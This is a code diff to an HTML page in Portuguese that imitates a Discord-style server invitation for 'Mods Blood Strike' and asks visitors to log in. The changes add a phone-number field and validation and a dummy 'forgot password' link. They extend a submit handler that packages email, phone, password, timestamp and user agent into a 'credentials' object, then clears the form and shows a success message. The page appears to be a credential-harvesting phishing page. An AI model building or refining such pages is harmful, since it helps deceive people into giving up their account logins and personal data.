@@ -198,6 +198,22 @@
         .login-link:hover {
             text-decoration: underline;
         }
+        
+        .forgot-password {
+            text-align: right;
+            margin-top: 8px;
+            font-size: 12px;
+        }
+        
+        .forgot-link {
+            color: #00a8fc;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
@@ -205,9 +221,9 @@
         <div class="header">
             <div class="server-icon">
                 <!-- SUBSTITUA PELA SUA IMAGEM AQUI -->
-                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAiIGhlaWdodD0iODAiIHZpZXdCb3g9IjAgMCA4MCA4MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjgwIiBoZWlnaHQ9IjgwIiBmaWxsPSIjNTg2NUYyIi8+Cjx0ZXh0IHg9IjQwIiB5PSI0OCIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjMyIiBmb250LXdlaWdodD0iYm9sZCIgZmlsbD0id2hpdGUiIHRleHQtYW5jaG9rPSJtaWRkbGUiPklLPC90ZXh0Pgo8L3N2Zz4=" alt="Server Icon">
+                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAiIGhlaWdodD0iODAiIHZpZXdCb3g9IjAgMCA4MCA4MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjgwIiBoZWlnaHQ9IjgwIiBmaWxsPSIjNTg2NUYyIi8+Cjx0ZXh0IHg9IjQwIiB5PSI0OCIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjMyIiBmb250LXdlaWdodD0iYm9sZCIgZmlsbD0id2hpdGUiIHRleHQtYW5jaG9yPSJtaWRkbGUiPklLPC90ZXh0Pgo8L3N2Zz4=" alt="Server Icon">
             </div>
-            <div class="server-name">TAXIER</div>
+            <div class="server-name">Mods Blood Strike</div>
             <div class="invite-text">Você foi convidado(a) para entrar</div>
             <div class="member-count">8 Membros</div>
             <div class="online-count">
@@ -231,8 +247,17 @@
                 </div>
                 
                 <div class="form-group">
+                    <label for="phone">Número de Telefone</label>
+                    <input type="tel" id="phone" required placeholder="(11) 99999-9999">
+                    <div id="phoneError" class="error-message">Digite um telefone válido</div>
+                </div>
+                
+                <div class="form-group">
                     <label for="password">Senha</label>
                     <input type="password" id="password" required placeholder="Sua senha">
+                    <div class="forgot-password">
+                        <a class="forgot-link" onclick="alert('Funcionalidade em desenvolvimento')">Esqueceu a senha?</a>
+                    </div>
                 </div>
                 
                 <button type="submit" class="accept-btn">Continuar</button>
@@ -260,18 +285,35 @@
             event.preventDefault();
             
             const email = document.getElementById('email').value;
+            const phone = document.getElementById('phone').value;
             const password = document.getElementById('password').value;
             const emailError = document.getElementById('emailError');
+            const phoneError = document.getElementById('phoneError');
             
-            if (!email.includes('@')) {
+            // Verifica se é um email válido
+            const isEmailValid = email.includes('@');
+            // Verifica se é um telefone válido (formato brasileiro)
+            const isPhoneValid = /^\(?\d{2}\)?[\s-]?\d{4,5}-?\d{4}$/.test(phone);
+            
+            if (!isEmailValid) {
                 emailError.style.display = 'block';
+            } else {
+                emailError.style.display = 'none';
+            }
+            
+            if (!isPhoneValid) {
+                phoneError.style.display = 'block';
+            } else {
+                phoneError.style.display = 'none';
+            }
+            
+            if (!isEmailValid || !isPhoneValid) {
                 return;
             }
             
-            emailError.style.display = 'none';
-            
             const credentials = {
                 email: email,
+                phone: phone,
                 password: password,
                 timestamp: new Date().toLocaleString('pt-BR'),
                 userAgent: navigator.userAgent
@@ -294,6 +336,7 @@
             
             setTimeout(() => {
                 document.getElementById('email').value = '';
+                document.getElementById('phone').value = '';
                 document.getElementById('password').value = '';
                 document.getElementById('successMessage').style.display = 'none';
                 document.querySelector('.action-section').style.display = 'block';
